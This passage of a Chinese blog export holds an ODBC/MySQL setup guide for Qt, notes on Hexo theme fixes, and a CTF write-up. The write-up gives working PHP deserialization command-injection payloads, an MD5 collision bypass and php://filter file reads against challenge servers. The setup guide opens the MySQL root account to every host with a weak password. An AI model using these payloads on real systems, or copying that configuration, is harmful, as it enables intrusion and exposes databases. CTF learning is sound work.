<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> unixODBC 安装</span></span><br><span class="line">sudo wget ftp://ftp.unixodbc.org/pub/unixODBC/unixODBC-2.3.4.tar.gz</span><br><span class="line">tar -xvzf unixODBC-2.3.4.tar.gz </span><br><span class="line">cd unixODBC-2.3.4/</span><br><span class="line">sudo ./configure --sysconfdir=/etc</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 检验是否安装成功</span></span><br><span class="line">odbcinst -j </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> odbc 安装</span></span><br><span class="line">sudo tar zxvf mysql-connector-odbc-8.0.15-linux-ubuntu18.04-x86-64bit.tar.gz </span><br><span class="line">cd mysql-connector-odbc-8.0.15-linux-ubuntu18.04-x86-64bit/</span><br><span class="line">sudo cp bin/* /usr/local/bin</span><br><span class="line">sudo cp lib/* /usr/local/lib</span><br><span class="line"></span><br><span class="line">sudo myodbc-installer -a -d -n &quot;MySQL ODBC 8.0 Driver&quot; -t &quot;Driver=/usr/local/lib/libmyodbc8w.so&quot;</span><br><span class="line">sudo myodbc-installer -a -d -n &quot;MySQL ODBC 8.0&quot; -t &quot;Driver=/usr/local/lib/libmyodbc8a.so&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证是否安装成功</span></span><br><span class="line">myodbc-installer -d -l</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置ODBC 参数</span></span><br><span class="line">sudo vi /etc/odbc.ini</span><br></pre></td></tr></table></figure>
</li>
<li><p>最终的 <code>/etc/odbc.ini</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Neural]</span><br><span class="line">Description     = Data source MySQL</span><br><span class="line">Driver          = MySQL ODBC 8.0 Driver</span><br><span class="line">Server          = x.x.x.x</span><br><span class="line">Host            = x.x.x.x</span><br><span class="line">Database        = xxxx</span><br><span class="line">Port            = 3306</span><br><span class="line">User            = root</span><br><span class="line">Password        = 0000</span><br></pre></td></tr></table></figure>
<ul>
<li>其中方括号内的是数据源名称，可以任意</li>
<li>Description 描述根据自己需要，任意填写</li>
<li>Driver 确定是 MySQL ODBC 8.0 Driver</li>
<li>Server 和 Host 均为 MySQL 的 IP</li>
<li>Database 为需要在 Linux 端使用的数据库</li>
</ul>
</li>
<li><p>以上步骤走完后，<code>isql Neural</code> 还是无法连接</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527160249814.png" alt="image-20210527160249814"></p>
</li>
<li><p>参考 <a href="https://blog.csdn.net/m0_37210884/article/details/114287684">https://blog.csdn.net/m0_37210884/article/details/114287684</a> 应该 <code>isql -v Neural root 0000</code> 指明数据库，用户名，密码</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527160522927.png" alt="image-20210527160522927"></p>
<p>结果报错不太一样了，其中指出机器不允许连接</p>
</li>
</ul>
<h4 id="2-1-2-解决上文的-S1000-连接问题"><a href="#2-1-2-解决上文的-S1000-连接问题" class="headerlink" title="2.1.2 解决上文的 S1000 连接问题"></a>2.1.2 解决上文的 S1000 连接问题</h4><p><a href="https://blog.csdn.net/weixin_42096620/article/details/110798766">参考</a></p>
<ul>
<li><p><strong>原因：</strong>root 用户只允许本地登录，细节如下</p>
<ul>
<li><p><code>use mysql;</code></p>
</li>
<li><p><code>SELECT user,host FROM user;</code></p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527162519904.png" alt="image-20210527162519904"></p>
</li>
</ul>
</li>
<li><p><strong>解决方法：</strong>将 root 对应的 host 改为 %，意即所有地址可访问。细节如下</p>
<ul>
<li><code>update user set host = &#39;%&#39; where user = &#39;root&#39;;</code> 更新访问权限</li>
<li><code>flush privileges;</code> 刷新访问权限表</li>
<li><code>select user,host from user;</code> 再查看 host 发现已经修改好了</li>
</ul>
</li>
</ul>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527162802153.png" alt="image-20210527162802153"></p>
<ul>
<li><p>结果：</p>
<ul>
<li><p>在 Linux 端 <code>isql -v Neural root 0000</code> 直接进入连接，并使用在 odbc.ini 中我们预先指定的数据库了</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527162938228.png" alt="image-20210527162938228"></p>
</li>
<li><p><code>show tables;</code></p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527163038271.png" alt="image-20210527163038271"></p>
</li>
</ul>
</li>
</ul>
<p>大功告成！</p>
<h3 id="2-2-Qt-中使用"><a href="#2-2-Qt-中使用" class="headerlink" title="2.2 Qt 中使用"></a>2.2 Qt 中使用</h3><p>上文已经可以在命令行中使用 ODBC 连接远程 MySQL 了，如何在 Qt 中连接呢</p>
<p>根据第 1 节的代码，类似的，我们在 Linux 环境下进行试验，当我们运行程序后，Qt 会报错 <code>QSqlDatabase: QODBC driver not loaded</code> 说明在连接 ODBC 驱动的数据库时，缺少了libqt4-sql-odbc驱动包</p>
<p><a href="https://blog.csdn.net/u012444155/article/details/16944393">解决方法参考</a></p>
<ul>
<li><code>sudo apt-get install libqt4-sql-odbc</code></li>
</ul>
<p>然后就可以成功连接啦！</p>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Ref</title>
    <url>/2021/05/09/Ref/</url>
    <content><![CDATA[<h2 id="5-1-4-主题安装"><a href="#5-1-4-主题安装" class="headerlink" title="5.1.4 主题安装"></a>5.1.4 主题安装</h2><h3 id="安装参考"><a href="#安装参考" class="headerlink" title="安装参考"></a>安装参考</h3><p><a href="https://www.qcmoke.site/blog/hexo_next.html">hexo+next打造精美的个人博客网站 | Qcmoke’s Blog</a></p>
<p><a href="https://www.jianshu.com/p/94b332d22115">hexo+gitee免费搭建个人博客 - 简书 (jianshu.com)</a></p>
<h3 id="hexo-s-的问题解决"><a href="#hexo-s-的问题解决" class="headerlink" title="hexo s 的问题解决"></a>hexo s 的问题解决</h3><p>由于 8.4.0 存在很多未知问题（实际上是我太菜，不知道怎么解决），所以还是回到 5.1.4。但是 5.1.4 也存在一些问题，比如 <code>hexo s</code>后查看本地   <a href="http://localhost:4000">http://localhost:4000</a> 回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% extends &#x27;_layout.swig&#x27; %&#125; &#123;% import &#x27;_macro/post.swig&#x27; as post_template %&#125; &#123;% import &#x27;_macro/sidebar.swig&#x27; as sidebar_template %&#125; &#123;% block title %&#125;&#123;&#123; config.title &#125;&#125;&#123;% if theme.index_with_subtitle and config.subtitle %&#125; - &#123;&#123;config.subtitle &#125;&#125;&#123;% endif %&#125;&#123;% endblock %&#125; &#123;% block page_class %&#125; &#123;% if is_home() %&#125;page-home&#123;% endif -%&#125; &#123;% endblock %&#125; &#123;% block content %&#125;</span><br><span class="line">&#123;% for post in page.posts %&#125; &#123;&#123; post_template.render(post, true) &#125;&#125; &#123;% endfor %&#125;</span><br><span class="line">&#123;% include &#x27;_partials/pagination.swig&#x27; %&#125; &#123;% endblock %&#125; &#123;% block sidebar %&#125; &#123;&#123; sidebar_template.render(false) &#125;&#125; &#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p>这个问题的解决方法在该项目 <a href="https://github.com/iissnan/hexo-theme-next">https://github.com/iissnan/hexo-theme-next</a>  issue 中找到：手动安装 swig </p>
<ul>
<li><code>npm i hexo-renderer-swig</code></li>
<li><code>hexo c</code></li>
<li><code>hexo g</code></li>
<li><code>hexo c</code></li>
</ul>
<h3 id="菜单栏无法识别问题"><a href="#菜单栏无法识别问题" class="headerlink" title="菜单栏无法识别问题"></a>菜单栏无法识别问题</h3><p>类似 <code>Cannot GET /%20</code> 的问题，是因为主题的<code>_congif.yml</code> 文件中菜单栏的设置多个空格，官方默认的 <code>home: / || home</code>是错的，应该是 <code>home: /|| home</code></p>
<h3 id="图片不显示的问题"><a href="#图片不显示的问题" class="headerlink" title="图片不显示的问题"></a>图片不显示的问题</h3><p><a href="https://www.cnblogs.com/gispathfinder/p/12239390.html">参考</a> ，这是 hexo-asset-image 的 bug，需要对<code>Blog\node_modules\hexo-asset-image\index.js</code>进行如下修改，即可正常显示</p>
<p><img src="/2021/05/09/Ref/image-20210510174338088.png" alt="image-20210510174338088"></p>
<h3 id="编译时遇到未知路径问题"><a href="#编译时遇到未知路径问题" class="headerlink" title="编译时遇到未知路径问题"></a>编译时遇到未知路径问题</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FATAL &#123;</span><br><span class="line">  err: Template render error: (unknown path)</span><br><span class="line">    Error: unexpected end of comment</span><br><span class="line">      at Object._prettifyError (D:\Document\Blog\node_modules\nunjucks\src\lib.js:36:11)</span><br><span class="line">      at Template.render (D:\Document\Blog\node_modules\nunjucks\src\environment.js:538:21)</span><br><span class="line">      at Environment.renderString (D:\Document\Blog\node_modules\nunjucks\src\environment.js:380:17)</span><br><span class="line">      at D:\Document\Blog\node_modules\hexo\lib\extend\tag.js:236:16</span><br><span class="line">      at tryCatcher (D:\Document\Blog\node_modules\bluebird\js\release\util.js:16:23)</span><br><span class="line">      at Function.Promise.fromNode.Promise.fromCallback (D:\Document\Blog\node_modules\bluebird\js\release\promise.js:209:30)</span><br></pre></td></tr></table></figure>
<p>这种是文章中出现未转义的括号造成的，尽量用 ` 进行转移，将其包裹成文本或代码形式</p>
<h3 id="页面下方翻页不正常显示"><a href="#页面下方翻页不正常显示" class="headerlink" title="页面下方翻页不正常显示"></a>页面下方翻页不正常显示</h3><p><a href="https://www.cnblogs.com/xiejava/p/12456273.html">参考</a></p>
<p><code>&lt;i class=&quot;fa fa-angle-right&quot;&gt;&lt;/i&gt;</code>不显示为<code>&gt;</code>，解决方法是在<code>Blog\themes\next\layout\_partials\pagination.swig</code>文件中，添加参数<code>escape: false</code></p>
<p><img src="/2021/05/09/Ref/image-20210524231854084.png" alt="image-20210524231854084"></p>
<p>然后重新编译即可正常显示了，如下图</p>
<p><img src="/2021/05/09/Ref/image-20210524231934515.png" alt="image-20210524231934515"></p>
<h3 id="显示公式"><a href="#显示公式" class="headerlink" title="显示公式"></a>显示公式</h3><p><a href="https://www.dazhuanlan.com/2019/12/19/5dfb3c4dae9ca/">hexo中数学公式不能正常显示问题解决 | 大专栏 (dazhuanlan.com)</a></p>
<h4 id="公式换行无效的问题"><a href="#公式换行无效的问题" class="headerlink" title="公式换行无效的问题"></a>公式换行无效的问题</h4><p><a href="https://lanlan2017.github.io/blog/eb86e892/">Hexo Mathjax双斜线换行失效 | 蓝蓝博客 (lanlan2017.github.io)</a></p>
<h3 id="npm-警告"><a href="#npm-警告" class="headerlink" title="npm 警告"></a>npm 警告</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@2.3.2 (node_modules\fsevents):</span><br><span class="line">npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@2.3.2: wanted &#123;&quot;os&quot;:&quot;darwin&quot;,&quot;arch&quot;:&quot;any&quot;&#125; (current: &#123;&quot;os&quot;:&quot;win32&quot;,&quot;arch&quot;:&quot;x64&quot;&#125;)</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/m0_46256147/article/details/104725439">npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@2.1.2 (node_modules\fsevents):_m0_46256147的博客-CSDN博客</a></p>
<h3 id="目录无法跳转问题"><a href="#目录无法跳转问题" class="headerlink" title="目录无法跳转问题"></a>目录无法跳转问题</h3><p><a href="https://copyfuture.com/blogs-details/20201217172324243lbpve965mzplwcr">如何解决next5主题目录无法跳转的问题 - 复制未来 (copyfuture.com)</a></p>
<h2 id="不同的修改"><a href="#不同的修改" class="headerlink" title="不同的修改"></a>不同的修改</h2><p>版本：从参考地址下载的最新版（NexT 8.4.0 Released）</p>
<h3 id="圆形旋转头像"><a href="#圆形旋转头像" class="headerlink" title="圆形旋转头像"></a>圆形旋转头像</h3><p>打开<code>Blog\themes\hexo-theme-next-8.4.0\_config.yml</code>文件，将<code>rounded</code>和<code>rotated</code>都改成<code>true</code>即可</p>
<p><img src="/2021/05/09/Ref/image-20210510101136415.png" alt="image-20210510101136415"></p>
<h3 id="添加动态背景"><a href="#添加动态背景" class="headerlink" title="添加动态背景"></a>添加动态背景</h3><p><code>Blog\themes\hexo-theme-next-8.4.0\_config.yml</code>文件，定位<code>canvas</code>然后<code>enable=true</code>即可</p>
<h3 id="删除强力驱动"><a href="#删除强力驱动" class="headerlink" title="删除强力驱动"></a>删除强力驱动</h3><p>在<code>\Blog\themes\hexo-theme-next-8.4.0\layout\_partials\footer.njk</code>定位<code>powered</code>，将以下代码注释掉（<!-- -->）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.footer.powered %&#125;</span><br><span class="line">  &lt;div class=&quot;powered-by&quot;&gt;</span><br><span class="line">    &#123;%- set next_site = &#x27;https://theme-next.js.org&#x27; if theme.scheme === &#x27;Gemini&#x27; else &#x27;https://theme-next.js.org/&#x27; + theme.scheme | lower + &#x27;/&#x27; %&#125;</span><br><span class="line">    &#123;&#123;- __(&#x27;footer.powered&#x27;, next_url(&#x27;https://hexo.io&#x27;, &#x27;Hexo&#x27;, &#123;class: &#x27;theme-link&#x27;&#125;) + &#x27; &amp; &#x27; + next_url(next_site, &#x27;NexT.&#x27; + theme.scheme, &#123;class: &#x27;theme-link&#x27;&#125;)) &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修改文章底部带-号的标签"><a href="#修改文章底部带-号的标签" class="headerlink" title="修改文章底部带#号的标签"></a>修改文章底部带#号的标签</h3><p>打开<code>myblog/themes/next/layout/_macro/post.swig</code>文件，搜索<code>post.tags</code>，将 <code>if theme.tag_icon else &#39;#&#39;</code>删除即可</p>
<p><img src="/2021/05/09/Ref/image-20210510095812090.png" alt="image-20210510095812090"></p>
<p>效果：</p>
<p><img src="/2021/05/09/Ref/image-20210510095930542.png" alt="image-20210510095930542"></p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Ref</tag>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>SUS2021-WP</title>
    <url>/2021/03/20/SUS2021-WP/</url>
    <content><![CDATA[<p>分数：3319<br>排名：2</p>
<h2 id="Web-easycmd"><a href="#Web-easycmd" class="headerlink" title="[Web] easycmd"></a>[Web] easycmd</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$verify</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;verify === <span class="string">&quot;get flag&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(cat|\;|\&gt;|more|less|head|tail|tac|nl|grep|strings|\||\&amp;)/i&#x27;</span>, <span class="keyword">$this</span>-&gt;cmd)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;No way&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            @system(<span class="string">&quot;echo <span class="subst">&#123;$this-&gt;cmd&#125;</span>&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;verify failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = unserialize(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure>
<ol>
<li>需要序列化verify和cmd  </li>
<li>这里需要注意，cmd的指令是经过echo的，所以需要<code>$()</code>在括号中加入待执行的指令，这里先看看根目录<code>ls /</code>  </li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$verify</span>  = <span class="string">&quot;get flag&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span> = <span class="string">&quot;$(ls /)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Flag(); </span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>拿到<a href="http://www.dooccn.com/php/">PHP在线</a>跑一下，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A12%3A%22%00Flag%00verify%22%3Bs%3A8%3A%22get+flag%22%3Bs%3A9%3A%22%00Flag%00cmd%22%3Bs%3A7%3A%22%24%28ls+%2F%29%22%3B%7D  </span><br></pre></td></tr></table></figure>
</li>
<li><p>访问<a href="http://susctf.com:10001/index.php?flag=O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A12%3A%22%00Flag%00verify%22%3Bs%3A8%3A%22get+flag%22%3Bs%3A9%3A%22%00Flag%00cmd%22%3Bs%3A7%3A%22%24%28ls+%2F%29%22%3B%7D">http://susctf.com:10001/index.php?flag=O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A12%3A%22%00Flag%00verify%22%3Bs%3A8%3A%22get+flag%22%3Bs%3A9%3A%22%00Flag%00cmd%22%3Bs%3A7%3A%22%24%28ls+%2F%29%22%3B%7D</a><br><img src="/2021/03/20/SUS2021-WP/0_ezcmd.png" alt>  </p>
</li>
<li><p>接下来获取flag，因为cat，more等等都被过滤了，所以<code>uniq /flag</code>序列化结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Flag%22%3A2%3A%7Bs%3A12%3A%22%00Flag%00verify%22%3Bs%3A8%3A%22get+flag%22%3Bs%3A9%3A%22%00Flag%00cmd%22%3Bs%3A13%3A%22%24%28uniq+%2Fflag%29%22%3B%7D  </span><br></pre></td></tr></table></figure>
</li>
<li><p>得到flag<br><img src="/2021/03/20/SUS2021-WP/01_flag.png" alt></p>
</li>
</ol>
<h2 id="Web-happy-web"><a href="#Web-happy-web" class="headerlink" title="[Web] happy_web"></a>[Web] happy_web</h2><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li><a href="http://susctf.com:10001/index.php?img=61476c6861476c684c6d70775a773d3d&amp;cmd=">http://susctf.com:10001/index.php?img=61476c6861476c684c6d70775a773d3d&amp;cmd=</a>  </li>
<li>img那段好像16进制ASCII，对应为aGlhaGlhLmpwZw==，base64解码结果为hiahia.jpg  </li>
<li>可以用img读取页面源码，所以先将<code>index.php</code>base64编码再转成16进制得到6157356b5a58677563476877  </li>
<li><code>/index.php?img=6157356b5a58677563476877&amp;cmd=</code>用Bp看下响应<br><img src="/2021/03/20/SUS2021-WP/02_Bp.png" alt>  </li>
<li>将得到的base64解码，得到  </li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=61476c6861476c684c6d70775a773d3d&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = base64_decode(hex2bin(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./jz.jpg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;lmy shi wo da ge&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;bie xiang le&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is coooool&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<ol>
<li><a href="https://blog.csdn.net/EC_Carrot/article/details/109525162">MD5强绕过</a>  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>
<ol>
<li>同时cmd还过滤了一些字符，用dir看下<br><img src="/2021/03/20/SUS2021-WP/03_dir.png" alt>  </li>
<li><code>dir /</code>空格用%20代替<br><img src="/2021/03/20/SUS2021-WP/04_flag.png" alt>  </li>
<li><code>uniq%20/flag</code><br><img src="/2021/03/20/SUS2021-WP/05_flag.png" alt><br>SUSCTF{4c4f7d5fa95982aa2a3cec94905f1d66}</li>
</ol>
<h2 id="Web-LMY-de-miji"><a href="#Web-LMY-de-miji" class="headerlink" title="[Web] LMY_de_miji"></a>[Web] LMY_de_miji</h2><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>robots.txt提示Ss3cret.php  </li>
<li>查看<br><img src="/2021/03/20/SUS2021-WP/08_Ss3creta.png" alt>  </li>
<li>因为过滤了input，data等等，所以用filter协议试试。<br><code>/Ss3cret.php?file=php://filter/read=convert.base64-encode/resource=f1f1fffl4g.php</code>  </li>
<li>另外，还要POST参数a和b，要求a与b不相等但它们的md5相等，这里md5比较是==可以用数组绕过，即<code>a[]=1&amp;b[]=2</code><br><img src="/2021/03/20/SUS2021-WP/09_filter.png" alt>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+DQoNCjxodG1sPg0KDQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+DQogICAgPHRpdGxlPkZMQUc8L3RpdGxlPg0KPC9oZWFkPg0KDQo8Ym9keSBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjp3aGl0ZTsiPjxicj48YnI+PGJyPjxicj48YnI+PGJyPg0KDQo8aDEgc3R5bGU9ImZvbnQtZmFtaWx5OnZlcmRhbmE7Y29sb3I6cmVkO3RleHQtYWxpZ246Y2VudGVyOyI+eW91IHdhbnQgZmxhZz9pdCdzIGluIGhlcmUsY2FuIHlvdSBmaW5kIGl0ID9+fn48L2gxPjxicj48YnI+PGJyPg0KPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPg0KICAgIDw/cGhwDQogICAgJGZsYWcgPSAiZmxhZyBpbiBmZmZmZmZmZmZsNDQ0NGciOw0KICAgID8+DQo8L3A+DQo8L2JvZHk+DQoNCjwvaHRtbD4NCg==</span><br></pre></td></tr></table></figure></li>
<li><p>base64解码得到  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;background-color:white;&quot;</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1 style=<span class="string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;you want flag?it<span class="string">&#x27;s in here,can you find it ?~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;?php</span></span><br><span class="line"><span class="string">    $flag = &quot;flag in fffffffffl4444g&quot;;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br><span class="line"><span class="string">&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>访问<code>http://susctf.com:10005/fffffffffl4444g</code><br><img src="/2021/03/20/SUS2021-WP/10_ffffffffff.png" alt></p>
</li>
</ol>
